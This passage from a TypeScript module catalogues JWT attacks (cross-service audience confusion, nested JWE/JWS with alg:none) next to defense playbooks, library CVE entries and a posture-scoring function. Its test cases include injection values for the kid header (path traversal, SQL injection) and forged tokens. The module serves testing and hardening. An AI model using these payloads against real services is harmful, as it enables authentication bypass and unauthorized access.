      "Token binding: include client fingerprint (IP hash, TLS binding) in claims",
      "Transmit tokens only in Authorization header, never in URL/query params",
      "Implement token revocation via deny-list (Redis/DB) for logout",
    ],
    references: [
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
    ],
  },
  {
    id: "jwt-atk-11",
    name: "Cross-Service Token Confusion",
    attack: "cross-service-confusion",
    severity: "high",
    cvss: 7.5,
    cwes: ["CWE-345", "CWE-285"],
    description:
      "Use a valid JWT issued by Service A to authenticate to Service B. If Service B " +
      "doesn't validate the 'aud' (audience) or 'iss' (issuer) claims, it may accept " +
      "tokens not intended for it — especially in microservice architectures sharing signing keys.",
    prerequisites: [
      "Multiple services accept JWTs signed with the same key or by the same IdP",
      "Target service doesn't validate 'aud' or 'iss' claims",
    ],
    steps: [
      "1. Obtain a valid JWT from Service A (lower-privilege or public-facing)",
      "2. Present the token to Service B's API endpoints",
      "3. Observe if Service B accepts it without checking audience",
      "4. Escalate: Service A token might have different claims (role, permissions) but Service B treats them generically",
    ],
    payloads: [
      "Use token from public API against admin/internal microservice",
      "Use token with aud:service-a against service-b",
    ],
    indicators: [
      "Token accepted by service it was not issued for",
      "Same signing key across multiple services",
      "No aud/iss validation in token verification config",
    ],
    detectionMethods: [
      "Audit: ensure every service validates aud matches its own identifier",
      "Monitor: log mismatched aud values across services",
      "Test: try tokens from one service against all other services",
    ],
    automatable: true,
    tools: ["Burp Suite", "Postman (multi-service testing)", "curl"],
    remediation: [
      "Every service MUST validate 'aud' matches its own identifier",
      "Validate 'iss' against the expected token issuer",
      "Use different signing keys per service when possible",
      "In microservices: use service-to-service mTLS, not shared JWTs",
    ],
    references: [
      "https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.3",
    ],
  },
  {
    id: "jwt-atk-12",
    name: "Nested JWT / JWE Confusion",
    attack: "nested-jwt-abuse",
    severity: "high",
    cvss: 7.5,
    cwes: ["CWE-347"],
    description:
      "Exploit the difference between JWS (signed) and JWE (encrypted) processing. " +
      "In nested JWTs (a JWS inside a JWE), vulnerabilities arise when the server " +
      "decrypts but doesn't verify the inner signature, or when the cty (content type) " +
      "header is manipulated to alter processing logic.",
    prerequisites: [
      "Server supports JWE (encrypted tokens)",
      "Server handles nested JWT (cty: 'JWT')",
      "Inner signature verification is weak or skipped after decryption",
    ],
    steps: [
      "1. Identify if the server accepts JWE tokens (look for encrypted payloads, 5-part tokens)",
      "2. Create a JWE-wrapped JWS where the inner JWS uses none algorithm",
      "3. Set cty: 'JWT' in JWE header to trigger nested processing",
      "4. Observe if server decrypts the outer JWE but skips inner JWS signature verification",
      "5. Alternative: send a signed-only token where encrypted is expected and vice versa",
    ],
    payloads: [
      'JWE header: {"alg":"RSA-OAEP","enc":"A256GCM","cty":"JWT"} wrapping JWS with alg:none',
    ],
    indicators: [
      "Server accepts both JWS and JWE tokens",
      "Token with cty:'JWT' processed differently",
      "Inner signature not verified after JWE decryption",
    ],
    detectionMethods: [
      "Test: send JWS where JWE is expected and vice versa",
      "Log: track token format types (JWS vs JWE vs nested)",
      "Audit: verify inner JWS signature is checked after JWE decryption",
    ],
    automatable: false,
    tools: ["jose CLI", "custom scripts", "Burp Suite"],
    remediation: [
      "Always verify inner JWS signature after JWE decryption",
      "Validate cty header — reject unexpected values",
      "Strictly separate JWS and JWE processing paths",
      "Pin expected token format (JWS-only or JWE-only) per endpoint",
    ],
    references: [
      "https://www.rfc-editor.org/rfc/rfc7519#section-5.2",
    ],
  },
];

// ─────────────────────────────────────────────────────────────────────────────
//  JWT Defense Playbooks (8 categories)
// ─────────────────────────────────────────────────────────────────────────────

export const JWT_DEFENSE_PLAYBOOKS: JwtDefensePlaybook[] = [
  {
    id: "jwt-def-01",
    name: "Algorithm Pinning",
    category: "algorithm-pinning",
    description:
      "Explicitly specify which algorithms the server accepts for JWT verification. " +
      "Never trust the algorithm declared in the token header.",
    mitigatesAttacks: ["none-algorithm", "algorithm-confusion"],
    effectiveness: 10,
    implementation: {
      principle: "Server-side algorithm enforcement — the token's 'alg' header is UNTRUSTED input.",
      codeExamples: [
        {
          language: "Node.js (jsonwebtoken)",
          code: `jwt.verify(token, publicKey, { algorithms: ['RS256'] });`,
          notes: "Pin to ONLY the algorithm(s) you use. Never omit the algorithms option.",
        },
        {
          language: "Python (PyJWT)",
          code: `jwt.decode(token, key, algorithms=['RS256'])`,
          notes: "PyJWT ≥2.0 requires 'algorithms' parameter. Older versions were vulnerable.",
        },
        {
          language: "Go (golang-jwt)",
          code: `token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {\n  if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {\n    return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])\n  }\n  return publicKey, nil\n})`,
          notes: "Explicitly check the signing method type before returning the key.",
        },
        {
          language: "Java (jjwt)",
          code: `Jwts.parserBuilder()\n  .setSigningKey(publicKey)\n  .build()\n  .parseClaimsJws(token);`,
          notes: "JJWT ≥0.12 auto-rejects none and mismatched algorithms.",
        },
      ],
      configuration: [
        "Set algorithms whitelist in EVERY JWT verification call",
        "Use asymmetric algorithms only (RS256/ES256) when possible",
        "If using HMAC, ensure key ≥ 256 bits and never expose it",
      ],
      commonMistakes: [
        "Omitting the algorithms option (defaults may include 'none')",
        "Accepting ['RS256', 'HS256'] together (enables confusion attack)",
        "Using symmetric HMAC with a short/guessable secret",
      ],
    },
    testCases: [
      {
        name: "Reject None Algorithm",
        description: "Verify that tokens with alg='none' are rejected",
        steps: ["Create token with alg:none", "Remove signature", "Send to API", "Verify 401 response"],
        expected: "401 Unauthorized — invalid algorithm",
        automatable: true,
      },
      {
        name: "Reject Algorithm Confusion",
        description: "Verify RS256→HS256 confusion attack is blocked",
        steps: ["Get server public key", "Sign token with HS256 using public key", "Send to API"],
        expected: "401 Unauthorized — algorithm mismatch",
        automatable: true,
      },
      {
        name: "Reject Case-Variant None",
        description: "Verify case variations of 'none' (None, NONE, nOnE) are rejected",
        steps: ["Try None, NONE, nOnE, nonE as alg", "Send each variant"],
        expected: "All variants rejected with 401",
        automatable: true,
      },
    ],
    references: [
      "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
    ],
  },
  {
    id: "jwt-def-02",
    name: "Key Management & Rotation",
    category: "key-management",
    description:
      "Secure key storage, separate key types for symmetric/asymmetric, regular key rotation, " +
      "and proper JWKS endpoint configuration.",
    mitigatesAttacks: ["algorithm-confusion", "kid-path-traversal", "kid-sql-injection", "kid-command-injection"],
    effectiveness: 9,
    implementation: {
      principle: "Keys are managed server-side in a trusted store — never derived from token headers or user input.",
      codeExamples: [
        {
          language: "Node.js (jwks-rsa)",
          code: `const jwksClient = require('jwks-rsa');\nconst client = jwksClient({ jwksUri: 'https://your-idp/.well-known/jwks.json', cache: true, rateLimit: true });\nconst key = await client.getSigningKey(kid); // kid validated against JWKS`,
          notes: "Use jwks-rsa for automatic key rotation via JWKS endpoint.",
        },
        {
          language: "Key Rotation",
          code: `// 1. Generate new key pair\n// 2. Add new public key to JWKS (now has 2 keys)\n// 3. Start signing NEW tokens with new key (kid = new-key-id)\n// 4. Old tokens verify via old key in JWKS until they expire\n// 5. After max-token-lifetime, remove old key from JWKS`,
          notes: "Overlap period ensures zero-downtime rotation.",
        },
      ],
      configuration: [
        "Store keys in KMS/HSM (AWS KMS, Azure Key Vault, GCP Cloud KMS) — never in code/config files",
        "Rotate keys every 90 days minimum",
        "JWKS endpoint: serve over HTTPS with CORS restricted to your domains",
        "Cache JWKS responses with short TTL (5-15 min) to pick up rotations",
        "Use unique kid identifiers (UUID v4) for each key",
      ],
      commonMistakes: [
        "Hardcoding signing keys in source code or environment variables on disk",
        "Using the same key for all services (compromises all if one leaks)",
        "Not rotating keys after suspected compromise",
        "Filesystem-based key lookup using kid parameter (path traversal risk)",
      ],
    },
    testCases: [
      {
        name: "Key Rotation Continuity",
        description: "Verify old tokens still work during rotation window",
        steps: ["Issue token with old key", "Deploy new key", "Verify old token still validates"],
        expected: "Old tokens valid until expiration; new tokens use new key",
        automatable: true,
      },
      {
        name: "Kid Injection Resistance",
        description: "Verify kid values with path traversal/SQL are rejected",
        steps: ["Send token with kid: '../../../../dev/null'", "Send with kid: \"' OR '1'='1\""],
        expected: "Both rejected — kid not found or invalid format",
        automatable: true,
      },
    ],
    references: [
      "https://auth0.com/docs/secure/tokens/json-web-tokens/json-web-key-set-properties",
    ],
  },
  {
    id: "jwt-def-03",
    name: "Comprehensive Claim Validation",
    category: "claim-validation",
    description:
      "Validate ALL standard claims (exp, nbf, iss, aud, sub, jti, iat) and cross-reference " +
      "authorization claims against a server-side source of truth.",
    mitigatesAttacks: ["claim-tampering", "cross-service-confusion", "token-replay"],
    effectiveness: 9,
    implementation: {
      principle: "JWT claims are ASSERTIONS — verify each one server-side. Never use unvalidated claims for authorization.",
      codeExamples: [
        {
          language: "Node.js (jsonwebtoken)",
          code: `jwt.verify(token, key, {\n  algorithms: ['RS256'],\n  issuer: 'https://your-idp.example.com',\n  audience: 'your-api-identifier',\n  clockTolerance: 30, // seconds\n  maxAge: '1h',\n});`,
          notes: "Validates exp, iss, aud, and maxAge automatically.",
        },
        {
          language: "Python (PyJWT)",
          code: `jwt.decode(token, key,\n  algorithms=['RS256'],\n  issuer='https://your-idp.example.com',\n  audience='your-api-id',\n  options={'require': ['exp', 'iss', 'aud', 'sub']}\n)`,
          notes: "Use 'require' to fail if mandatory claims are missing.",
        },
      ],
      configuration: [
        "Require: exp, iss, aud, sub as mandatory claims",
        "Validate iss matches your known issuer URL exactly",
        "Validate aud matches your service identifier",
        "Set clockTolerance to ≤60 seconds for exp/nbf",
        "For authorization claims (role, scope, permissions), ALWAYS cross-check against database/IdP",
        "Use jti for replay detection with server-side tracking (Redis set)",
      ],
      commonMistakes: [
        "Trusting 'role' or 'permissions' claims without server-side verification",
        "Not requiring 'aud' — enables cross-service confusion",
        "Large clockTolerance allowing expired tokens for too long",
        "Not validating 'iss' — accepting tokens from any issuer",
      ],
    },
    testCases: [
      {
        name: "Expired Token Rejected",
        description: "Verify expired tokens are rejected",
        steps: ["Create token with exp = now - 300", "Send to API"],
        expected: "401 — token expired",
        automatable: true,
      },
      {
        name: "Wrong Audience Rejected",
        description: "Verify tokens for other services are rejected",
        steps: ["Create valid token with aud = 'other-service'", "Send to API"],
        expected: "401 — invalid audience",
        automatable: true,
      },
      {
        name: "Wrong Issuer Rejected",
        description: "Verify tokens from unknown issuers are rejected",
        steps: ["Create token with iss = 'https://evil-idp.com'", "Send to API"],
        expected: "401 — invalid issuer",
        automatable: true,
      },
      {
        name: "Modified Claims Rejected",
        description: "Verify signature fails when claims are modified",
        steps: ["Take valid token", "Modify role claim", "Send without re-signing"],
        expected: "401 — invalid signature",
        automatable: true,
      },
    ],
    references: [
      "https://datatracker.ietf.org/doc/html/rfc7519#section-4.1",
    ],
  },
  {
    id: "jwt-def-04",
    name: "Token Lifecycle Management",
    category: "token-lifecycle",
    description:
      "Short-lived access tokens, refresh token rotation, server-side revocation, " +
      "and proper logout handling.",
    mitigatesAttacks: ["token-replay", "claim-tampering"],
    effectiveness: 8,
    implementation: {
      principle: "Access tokens are short-lived (15-60 min). Refresh tokens are rotated on each use. Server-side revocation for logout.",
      codeExamples: [
        {
          language: "Token Pattern",
          code: `// Access token: short-lived, stateless\n{ exp: now + 900, type: 'access', sub: userId }\n\n// Refresh token: longer-lived, tracked server-side\n{ exp: now + 604800, type: 'refresh', jti: randomUUID(), sub: userId }\n\n// On refresh:\n// 1. Validate refresh token\n// 2. Check jti against revocation list\n// 3. Issue NEW access token + NEW refresh token (rotate jti)\n// 4. Invalidate old refresh token jti`,
          notes: "Refresh token rotation detects token theft — if old token is reused, revoke all for that user.",
        },
      ],
      configuration: [
        "Access token lifetime: 15 minutes (API), 60 minutes max (web sessions)",
        "Refresh token lifetime: 7-30 days, with absolute maximum",
        "Rotate refresh tokens on every use — new jti each time",
        "Track refresh token jti in Redis/DB for revocation",
        "On logout: add jti to deny-list, clear client storage",
        "On password change: revoke ALL refresh tokens for the user",
      ],
      commonMistakes: [
        "Access tokens lasting days or weeks",
        "Not rotating refresh tokens — stolen refresh token stays valid",
        "No server-side revocation — logout only clears client storage",
        "Storing tokens in localStorage (XSS accessible) instead of httpOnly cookies",
      ],
    },
    testCases: [
      {
        name: "Token Expiration Enforced",
        description: "Verify expired access tokens are rejected immediately",
        steps: ["Wait for token expiration", "Send expired token", "Verify rejection"],
        expected: "401 after token expiry with no grace period beyond clockTolerance",
        automatable: true,
      },
      {
        name: "Refresh Token Rotation",
        description: "Verify old refresh tokens are invalidated after rotation",
        steps: ["Use refresh token to get new pair", "Try old refresh token again"],
        expected: "Old refresh token rejected, user session revoked (theft detection)",
        automatable: true,
      },
      {
        name: "Logout Revocation",
        description: "Verify tokens are revoked on logout",
        steps: ["Login, get tokens", "Call logout endpoint", "Try access token", "Try refresh token"],
        expected: "Both tokens rejected after logout",
        automatable: true,
      },
    ],
    references: [
      "https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/",
    ],
  },
  {
    id: "jwt-def-05",
    name: "Library Hardening",
    category: "library-hardening",
    description:
      "Use well-maintained JWT libraries with proper configuration. Keep them updated. " +
      "Understand each library's defaults and pitfalls.",
    mitigatesAttacks: ["none-algorithm", "algorithm-confusion", "jwk-self-signed", "jku-poisoning", "nested-jwt-abuse"],
    effectiveness: 8,
    implementation: {
      principle: "Choose maintained libraries with secure defaults. Never implement JWT verification from scratch.",
      codeExamples: [
        {
          language: "Recommended Libraries",
          code: `// Node.js:  jose (by panva) — zero dependencies, supports JWE, strict defaults\n// Python:   PyJWT ≥2.0 — requires algorithms param\n// Go:       golang-jwt/jwt ≥5 — strict method checking\n// Java:     jjwt ≥0.12 — auto-rejects none, Nimbus JOSE+JWT\n// .NET:     System.IdentityModel.Tokens.Jwt — Microsoft's official\n// Rust:     jsonwebtoken — algorithm pinning by default`,
          notes: "Prefer 'jose' (Node.js) over 'jsonwebtoken' for new projects — it has stricter defaults.",
        },
      ],
      configuration: [
        "Update JWT libraries regularly — CVEs are common",
        "Review library changelog for security fixes on each update",
        "Test library behavior: does it reject none? Does it reject alg mismatch?",
        "Avoid libraries that haven't been updated in >1 year",
      ],
      commonMistakes: [
        "Using unsupported/archived JWT libraries",
        "Not setting algorithms parameter (library-dependent defaults)",
        "Custom JWT verification code instead of using a library",
        "Not testing library behavior with attack payloads",
      ],
    },
    testCases: [
      {
        name: "Library Default Behavior",
        description: "Verify library rejects none/confusion by default",
        steps: ["Send none alg token", "Send HS256 token when RS256 configured"],
        expected: "Both rejected without explicit configuration needed (modern libraries)",
        automatable: true,
      },
    ],
    references: [
      "https://jwt.io/libraries",
    ],
  },
  {
    id: "jwt-def-06",
    name: "Transport Security",
    category: "transport-security",
    description:
      "Ensure tokens are transmitted securely — HTTPS only, httpOnly cookies, " +
      "no URL parameters, proper CORS.",
    mitigatesAttacks: ["token-replay"],
    effectiveness: 7,
    implementation: {
      principle: "Tokens must only travel over encrypted channels and be stored securely on the client.",
      codeExamples: [
        {
          language: "Cookie-based token storage",
          code: `res.cookie('access_token', token, {\n  httpOnly: true,   // No JavaScript access\n  secure: true,     // HTTPS only\n  sameSite: 'strict', // CSRF protection\n  maxAge: 900000,   // 15 minutes\n  path: '/api',     // Scope to API paths\n});`,
          notes: "Cookies with httpOnly+secure+sameSite are the most secure browser storage.",
        },
      ],
      configuration: [
        "HTTPS required for all token-bearing requests",
        "Store tokens in httpOnly, secure, sameSite cookies — NOT localStorage",
        "Never send tokens in URL query parameters (referer leakage, server logs)",
        "Set Strict-Transport-Security header to prevent downgrade",
        "CORS: restrict to known origins, no wildcards with credentials",
      ],
      commonMistakes: [
        "Storing tokens in localStorage (XSS-extractable)",
        "Sending tokens in URL parameters (?token=eyJ...)",
        "Not using httpOnly flag on token cookies",
        "Allowing HTTP (non-TLS) token transmission",
      ],
    },
    testCases: [
      {
        name: "No Token in URL",
        description: "Verify API doesn't accept tokens via URL parameters",
        steps: ["Send request with token in query string", "Check if accepted"],
        expected: "Token in query string not accepted — only Authorization header or httpOnly cookie",
        automatable: true,
      },
      {
        name: "Cookie Flags",
        description: "Verify token cookies have httpOnly, secure, sameSite",
        steps: ["Login and inspect Set-Cookie header", "Check all flags"],
        expected: "httpOnly=true, secure=true, sameSite=strict (or lax)",
        automatable: true,
      },
    ],
    references: [
      "https://owasp.org/www-community/HttpOnly",
    ],
  },
  {
    id: "jwt-def-07",
    name: "JWT Security Monitoring",
    category: "monitoring",
    description:
      "Monitor JWT usage patterns, detect anomalies, alert on attack signatures, " +
      "and maintain an audit trail.",
    mitigatesAttacks: ["token-replay", "claim-tampering", "none-algorithm", "algorithm-confusion"],
    effectiveness: 7,
    implementation: {
      principle: "Every JWT verification attempt should be logged. Anomalies trigger alerts.",
      codeExamples: [
        {
          language: "Monitoring Signals",
          code: `// Log these events:\n// 1. Verification failures — count by reason (expired, bad sig, wrong alg)\n// 2. Algorithm mismatches — critical alert\n// 3. Token from unknown issuer — critical alert\n// 4. Same token replayed from different IP\n// 5. Token with 'none', 'jwk', 'jku', 'x5c' headers — security incident\n// 6. Kid values containing path/SQL characters — attack attempt`,
          notes: "Feed these signals into your SIEM/alerting system.",
        },
      ],
      configuration: [
        "Log: token subject, issuer, audience, algorithm, kid, IP, timestamp on every verify",
        "Alert: any 'none' algorithm detection",
        "Alert: algorithm changes between requests for same subject",
        "Alert: token used from multiple geolocations within impossible travel time",
        "Metric: verification failure rate — spike indicates attack",
        "Retain: auth logs for compliance period (90 days minimum)",
      ],
      commonMistakes: [
        "Not logging verification failures",
        "Logging full token values (contains claims — may have PII)",
        "No alerting on none/confusion attempts",
        "Not correlating JWT events with IP/user activity",
      ],
    },
    testCases: [
      {
        name: "Attack Detection Alerting",
        description: "Verify none-alg attack triggers alert",
        steps: ["Send none-alg token", "Check monitoring system for alert"],
        expected: "Security alert triggered with attacker IP and attack details",
        automatable: true,
      },
    ],
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
    ],
  },
  {
    id: "jwt-def-08",
    name: "Secure JWT Architecture",
    category: "architecture",
    description:
      "Design-level decisions: asymmetric algorithms, centralized IdP, " +
      "token introspection for sensitive operations, and proper separation of concerns.",
    mitigatesAttacks: ["algorithm-confusion", "cross-service-confusion", "jwk-self-signed", "jku-poisoning"],
    effectiveness: 9,
    implementation: {
      principle: "Use a centralized IdP (Auth0, Keycloak, Entra ID). Prefer asymmetric algorithms. Separate access from refresh tokens.",
      codeExamples: [
        {
          language: "Architecture Pattern",
          code: `// Recommended Architecture:\n// 1. Centralized IdP issues tokens (Auth0, Keycloak, Entra ID)\n// 2. IdP publishes JWKS at /.well-known/jwks.json\n// 3. Services fetch JWKS and validate locally (no IdP roundtrip per request)\n// 4. Each service has its own audience value\n// 5. For sensitive ops (password change, payment): use token introspection endpoint\n// 6. Refresh tokens: opaque (non-JWT), stored server-side, rotated on use`,
          notes: "This pattern gives you: centralized key management, per-service audience, revocation via IdP.",
        },
      ],
      configuration: [
        "Use RS256 or ES256 (asymmetric) — only IdP has the private key",
        "Each microservice validates with public key from JWKS — never needs the secret",
        "Per-service audience claim prevents cross-service confusion",
        "Use token introspection (RFC 7662) for high-value operations",
        "Refresh tokens should be opaque, not JWT — stored and tracked server-side",
      ],
      commonMistakes: [
        "Sharing HMAC secret keys across services (single point of failure)",
        "Each service issuing its own JWTs (no centralized control)",
        "Using JWT refresh tokens (they can't be individually revoked without tracking)",
        "Not having a JWKS endpoint for key rotation",
      ],
    },
    testCases: [
      {
        name: "Cross-Service Isolation",
        description: "Verify tokens from one service are rejected by another",
        steps: ["Get token from service A", "Present to service B"],
        expected: "401 — invalid audience",
        automatable: true,
      },
      {
        name: "JWKS Endpoint Security",
        description: "Verify JWKS endpoint is properly configured",
        steps: ["Fetch /.well-known/jwks.json", "Check HTTPS, CORS, rate limiting"],
        expected: "JWKS served over HTTPS, CORS restricted, rate-limited",
        automatable: true,
      },
    ],
    references: [
      "https://datatracker.ietf.org/doc/html/rfc7519",
      "https://datatracker.ietf.org/doc/html/rfc7662",
    ],
  },
];

// ─────────────────────────────────────────────────────────────────────────────
//  Library-Specific Vulnerability Signatures
// ─────────────────────────────────────────────────────────────────────────────

export const JWT_LIBRARY_VULNS: JwtLibraryVuln[] = [
  {
    library: "jsonwebtoken",
    language: "Node.js",
    version: "<4.2.2",
    vulnerability: "Algorithm confusion — accepts HS256 when RS256 configured",
    cve: "CVE-2016-10555",
    severity: "critical",
    description: "No algorithm enforcement by default. Attacker can switch RS256→HS256 and sign with public key.",
    fix: "Upgrade to ≥9.0.0 and always specify { algorithms: ['RS256'] }",
  },
  {
    library: "PyJWT",
    language: "Python",
    version: "<1.5.1",
    vulnerability: "None algorithm accepted by default",
    cve: "CVE-2015-9235",
    severity: "critical",
    description: "jwt.decode() accepted alg='none' without explicitly disabling it.",
    fix: "Upgrade to ≥2.0.0 — algorithms parameter is now required",
  },
  {
    library: "ruby-jwt",
    language: "Ruby",
    version: "<1.5.2",
    vulnerability: "None algorithm bypass",
    cve: "CVE-2015-9235",
    severity: "critical",
    description: "Accepted tokens with alg='none' regardless of configuration.",
    fix: "Upgrade to ≥2.0.0 and explicitly set algorithms",
  },
  {
    library: "php-jwt",
    language: "PHP",
    version: "<2.0",
    vulnerability: "Algorithm confusion — symmetric/asymmetric mix",
    cve: "CVE-2016-5431",
    severity: "critical",
    description: "No algorithm enforcement; HS256 accepted when RS256 configured.",
    fix: "Upgrade to ≥6.0.0 and specify allowed algorithms array",
  },
  {
    library: "go-jose",
    language: "Go",
    version: "<2.4",
    vulnerability: "Insufficient key validation for ECDSA signatures",
    cve: "CVE-2021-29482",
    severity: "high",
    description: "Denial of service via crafted ECDSA signature with invalid curve point.",
    fix: "Upgrade to go-jose ≥2.6 or switch to golang-jwt/jwt ≥5",
  },
  {
    library: "Nimbus JOSE+JWT",
    language: "Java",
    version: "<7.9",
    vulnerability: "ECDSA signature bypass — any signature validates for certain curves",
    cve: "CVE-2021-31684",
    severity: "critical",
    description: "Insufficient ECDSA signature validation allowed trivial signature bypass.",
    fix: "Upgrade to ≥9.0 — includes comprehensive signature validation",
  },
  {
    library: "jose (panva)",
    language: "Node.js",
    version: "*",
    vulnerability: "None known — strictest defaults",
    cve: "N/A",
    severity: "info",
    description: "Zero-dependency, strictly typed, rejects none/confusion by default. Recommended for new Node.js projects.",
    fix: "Keep updated",
  },
];

// ─────────────────────────────────────────────────────────────────────────────
//  Helper / Lookup Functions
// ─────────────────────────────────────────────────────────────────────────────

/** Get a JWT attack pattern by ID. */
export function getJwtAttack(id: string): JwtAttackPattern | undefined {
  return JWT_ATTACK_PATTERNS.find((a) => a.id === id);
}

/** Get all JWT attacks of a specific type. */
export function getJwtAttacksByType(type: JwtAttackType): JwtAttackPattern[] {
  return JWT_ATTACK_PATTERNS.filter((a) => a.attack === type);
}

/** Get JWT attacks by severity. */
export function getJwtAttacksBySeverity(severity: JwtSeverity): JwtAttackPattern[] {
  return JWT_ATTACK_PATTERNS.filter((a) => a.severity === severity);
}

/** Get all automatable JWT attacks (for CI integration). */
export function getAutomatableJwtAttacks(): JwtAttackPattern[] {
  return JWT_ATTACK_PATTERNS.filter((a) => a.automatable);
}

/** Get a JWT defense playbook by ID. */
export function getJwtDefense(id: string): JwtDefensePlaybook | undefined {
  return JWT_DEFENSE_PLAYBOOKS.find((d) => d.id === id);
}

/** Get defenses by category. */
export function getJwtDefensesByCategory(category: JwtDefenseCategory): JwtDefensePlaybook[] {
  return JWT_DEFENSE_PLAYBOOKS.filter((d) => d.category === category);
}

/** Get defenses that mitigate a specific attack type. */
export function getJwtDefensesForAttack(attackType: JwtAttackType): JwtDefensePlaybook[] {
  return JWT_DEFENSE_PLAYBOOKS.filter((d) => d.mitigatesAttacks.includes(attackType));
}

/** Get all JWT defense test cases. */
export function getAllJwtTestCases(): { defense: string; testCase: { name: string; description: string; steps: string[]; expected: string; automatable: boolean } }[] {
  const results: { defense: string; testCase: { name: string; description: string; steps: string[]; expected: string; automatable: boolean } }[] = [];
  for (const def of JWT_DEFENSE_PLAYBOOKS) {
    for (const tc of def.testCases) {
      results.push({ defense: def.name, testCase: tc });
    }
  }
  return results;
}

/** Get automatable JWT test cases only (for CI integration). */
export function getAutomatableJwtTests(): { defense: string; testCase: { name: string; steps: string[]; expected: string } }[] {
  return getAllJwtTestCases()
    .filter((tc) => tc.testCase.automatable)
    .map((tc) => ({
      defense: tc.defense,
      testCase: { name: tc.testCase.name, steps: tc.testCase.steps, expected: tc.testCase.expected },
    }));
}

/** Get library vulnerabilities by language. */
export function getJwtLibraryVulnsByLanguage(language: string): JwtLibraryVuln[] {
  return JWT_LIBRARY_VULNS.filter((v) => v.language.toLowerCase() === language.toLowerCase());
}

/** Get library vulnerabilities by severity. */
export function getJwtLibraryVulnsBySeverity(severity: JwtSeverity): JwtLibraryVuln[] {
  return JWT_LIBRARY_VULNS.filter((v) => v.severity === severity);
}

/**
 * Score a JWT security posture based on configuration.
 * Returns a score 0-100 and detailed breakdown.
 */
export function scoreJwtPosture(config: {
  algorithmPinned: boolean;
  noNoneAllowed: boolean;
  noMixedAlgorithms: boolean;
  requireExp: boolean;
  requireIss: boolean;
  requireAud: boolean;
  shortLifetime: boolean; // ≤60 min
  refreshRotation: boolean;
  revocationSupport: boolean;
  httpsOnly: boolean;
  httpOnlyCookies: boolean;
  jwksEndpoint: boolean;
  monitoring: boolean;
}): { score: number; maxScore: number; breakdown: { check: string; passed: boolean; weight: number }[] } {
  const checks = [
    { check: "Algorithm pinned", passed: config.algorithmPinned, weight: 15 },
    { check: "None algorithm rejected", passed: config.noNoneAllowed, weight: 10 },
    { check: "No mixed symmetric/asymmetric", passed: config.noMixedAlgorithms, weight: 10 },
    { check: "Expiration required", passed: config.requireExp, weight: 10 },
    { check: "Issuer validated", passed: config.requireIss, weight: 8 },
    { check: "Audience validated", passed: config.requireAud, weight: 8 },
    { check: "Short-lived tokens (≤60min)", passed: config.shortLifetime, weight: 7 },
    { check: "Refresh token rotation", passed: config.refreshRotation, weight: 7 },
    { check: "Token revocation supported", passed: config.revocationSupport, weight: 7 },
    { check: "HTTPS only", passed: config.httpsOnly, weight: 5 },
    { check: "HttpOnly cookies", passed: config.httpOnlyCookies, weight: 5 },
    { check: "JWKS endpoint for key rotation", passed: config.jwksEndpoint, weight: 4 },
    { check: "JWT security monitoring", passed: config.monitoring, weight: 4 },
  ];

  const maxScore = checks.reduce((sum, c) => sum + c.weight, 0);
  const score = checks.filter((c) => c.passed).reduce((sum, c) => sum + c.weight, 0);

  return { score, maxScore, breakdown: checks };
}
